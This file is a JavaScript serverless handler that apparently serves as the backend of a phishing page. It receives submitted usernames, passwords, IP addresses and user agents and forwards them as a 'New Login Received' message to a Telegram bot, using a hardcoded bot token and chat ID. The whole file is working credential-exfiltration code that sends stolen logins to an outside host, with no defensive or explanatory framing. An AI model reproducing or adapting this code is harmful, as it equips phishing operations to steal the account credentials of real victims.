export default async function handler(req, res) {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Handle preflight requests
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    // Only allow POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { username, password, ipInfo, userAgent } = req.body;
    const BOT_TOKEN = '8038389810:AAEPEktTfJXTCuyNGLfZc_ZAvZ49FrTbTGk';
    const CHAT_ID = '6748148257';

    const now = new Date();
    const timeString = now.toLocaleString();

    const message = `
? **New Login Received** ?
            
? **Username/Email:** ${username}
? **Password:** ${password}
? **IP Address:** ${ipInfo}
? **Time:** ${timeString}
? **User Agent:** ${userAgent}
    `;

    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const data = await response.json();

        if (data.ok) {
            res.status(200).json({ success: true, message: "Sent to Telegram" });
        } else {
            res.status(400).json({ success: false, error: data.description });
        }
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
}